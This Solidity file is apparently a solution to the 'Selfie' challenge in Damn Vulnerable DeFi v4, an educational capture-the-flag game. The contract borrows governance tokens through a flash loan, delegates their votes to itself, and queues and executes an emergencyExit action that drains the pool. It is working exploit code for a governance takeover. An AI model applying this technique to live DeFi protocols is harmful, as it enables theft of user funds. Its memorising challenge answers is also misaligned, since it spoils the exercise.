// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract Recover is IERC3156FlashBorrower {
    DamnValuableVotes public immutable token;
    SelfiePool public immutable pool;
    SimpleGovernance public immutable governance;
    address public immutable recovery;
    uint256 public actionId;

    constructor(
        address tokenAddress, 
        address poolAddress, 
        address governanceAddress,
        address recoveryAddress
    ) {
        token = DamnValuableVotes(tokenAddress);
        pool = SelfiePool(poolAddress);
        governance = SimpleGovernance(governanceAddress);
        recovery = recoveryAddress;
    }

    function executeQueueAction(uint256 amount) external {
        bytes memory data = "";
        token.approve(address(pool), amount);
        pool.flashLoan(this, address(token), amount, data);
    }

    function onFlashLoan(
        address initiator,
        address tokenAddress,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        token.delegate(address(this));
        actionId = governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", recovery)
        );
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function executeAction() external {
        governance.executeAction(actionId);
    }
}